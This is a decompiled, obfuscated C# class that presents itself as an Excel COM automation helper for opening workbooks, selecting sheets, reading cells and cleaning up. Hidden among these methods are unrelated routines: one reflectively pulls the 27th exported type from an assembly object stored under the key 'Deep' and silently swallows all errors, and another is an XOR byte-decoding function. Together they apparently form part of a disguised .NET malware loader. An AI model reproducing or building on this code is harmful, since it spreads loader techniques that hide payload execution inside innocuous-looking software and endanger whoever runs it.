using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.CompilerServices;
using Mk6;
using Yx8;
using g0Q;
using i2TA;
using m7P;

namespace o7Z;

public class Yy0
{
	private Ad4 _oXls;

	private Ck5 _oWBook;

	private Je7 _oSheet;

	public Ad4 OXls
	{
		get
		{
			return _oXls;
		}
		set
		{
			_oXls = value;
		}
	}

	public Ck5 OWBook
	{
		get
		{
			return _oWBook;
		}
		set
		{
			_oWBook = value;
		}
	}

	public Je7 OSheet
	{
		get
		{
			return _oSheet;
		}
		set
		{
			_oSheet = value;
		}
	}

	public Yy0()
	{
		_oXls = (Ad4)Activator.CreateInstance(Marshal.GetTypeFromCLSID(new Guid("00024500-0000-0000-C000-000000000046")));
	}

	public void Kn9(string Nt5, bool Nj1)
	{
		OWBook = OXls.Workbooks.Open(Nt5, RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing));
		OXls.Visible = Nj1;
	}

	internal static bool Ee2()
	{
		try
		{
			try
			{
				Type type = (Type)Aq1(RuntimeHelpers.GetObjectValue(r7X1.mDic["Deep"]));
				if (Operators.CompareString(type.Name, r7X1.mDic[r7X1.tName].ToString(), false) == 0)
				{
					r7X1.mDic.Add(r7X1.T, type);
					return true;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		return false;
	}

	public void o2D(string Jb6)
	{
		OSheet = (Je7)OWBook.Sheets[Jb6];
	}

	public Nq9 e6N(int g5L, int Qc6)
	{
		return (Nq9)OSheet.Cells[g5L, Qc6];
	}

	public void Dr8(bool g3A)
	{
		if (OWBook != null)
		{
			OWBook.Close(g3A, RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing));
		}
		OXls.Quit();
		Ad4 Yi = OXls;
		Hz4(ref Yi);
		OXls = Yi;
	}

	internal static byte t3G(byte t8E, byte[] Nd3, int a7K, int Qx9)
	{
		t8E = (byte)(t8E ^ checked((byte)(Nd3[unchecked(Qx9 % Nd3.Length)] ^ ((Qx9 + unchecked(a7K % Nd3.Length)) & a7K))));
		return t8E;
	}

	private static void Hz4<j4L>(ref j4L Yi5, bool Ab3 = false) where j4L : class
	{
		if (Yi5 == null)
		{
			return;
		}
		try
		{
			if (Marshal.IsComObject(Yi5))
			{
				if (Ab3)
				{
					Marshal.FinalReleaseComObject(Yi5);
				}
				else
				{
					Marshal.ReleaseComObject(Yi5);
				}
			}
		}
		finally
		{
			Yi5 = null;
		}
	}

	internal static object Aq1(object Cj5)
	{
		return NewLateBinding.LateIndexGet(NewLateBinding.LateGet(Cj5, (Type)null, "GetExportedTypes", new object[0], (string[])null, (Type[])null, (bool[])null), new object[1] { 27 }, (string[])null);
	}
}
